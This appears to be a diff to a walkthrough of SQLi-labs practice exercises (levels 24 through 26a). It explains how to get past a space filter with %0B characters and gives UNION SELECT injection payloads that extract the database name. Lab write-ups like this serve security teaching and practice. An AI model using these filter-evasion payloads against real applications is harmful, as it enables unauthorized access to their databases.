@@ -211,3 +211,16 @@ less-24
  * To bypass spaces we can use a non printable character such ``%0a`` or ``%0b`` which will acts as a space at the backend
  payload:**?id='%0Bunion%0Bselect%0B1,database(),3%0B%26%26%0B'1**
 ![image](https://user-images.githubusercontent.com/61080375/114918934-4acfda80-9e45-11eb-9652-e6cf6b5106f9.png)
+
+
+less-26a
+========
+
+It is same as 26 here ``')`` are used instead of ``'`` 
+
+so payload will be:
+```?id=')union%0Bselect%0B1,database(),3%26%26('1```
+
+![image](https://user-images.githubusercontent.com/61080375/115260182-25e2ac80-a150-11eb-8cf8-728a8f7f52a1.png)
+
+
